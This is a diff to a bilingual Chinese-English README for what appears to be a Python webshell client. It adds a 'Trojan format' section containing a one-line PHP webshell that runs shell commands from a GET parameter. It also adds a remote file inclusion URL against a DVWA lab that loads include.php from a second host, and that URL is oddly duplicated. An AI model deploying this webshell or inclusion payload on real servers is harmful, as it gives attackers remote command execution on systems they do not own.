@@ -12,14 +12,29 @@
 - 小巧隐蔽
 - (编不下去了
 
+木马格式 : 
+
+1 . PHP
+
+```php
+<? @echo(shell_exec($_GET['CMD']))
+```
+
+2 . 文件包含
+
+```
+http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/include.php
+# include.php同上
+```
+
 使用方法:
 
 在终端使用python命令运行
 
 **需要安装requests类库**
 
-![2.png](https://i.loli.net/2021/01/31/51yG2aDutoVlnCO.png)
 ![1.png](https://i.loli.net/2021/01/31/38qQGkAKhzTugOC.png)
+![2.png](https://i.loli.net/2021/01/31/51yG2aDutoVlnCO.png)
 
 <u>缺点 : 没有办法输入交互</u>
 
@@ -38,6 +53,21 @@ Applicable to a series of webshells such as **a Trojan sentence**
   
   <br/>
 
+Trojan Format :
+
+1 . PHP
+
+```php
+<? @echo(shell_exec($_GET['CMD']))
+```
+
+2 . File Inclusion
+
+```
+http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/include.php
+# 'include.php' Same as above
+```
+
 Usage:
 
 Run it from the terminal using 'python' commands
@@ -46,6 +76,7 @@ Run it from the terminal using 'python' commands
 
 <br/>
 
+![1.png](https://i.loli.net/2021/01/31/38qQGkAKhzTugOC.png)
 ![2.png](https://i.loli.net/2021/01/31/51yG2aDutoVlnCO.png)
 
 <u>Cons: No way to enter interaction</u>
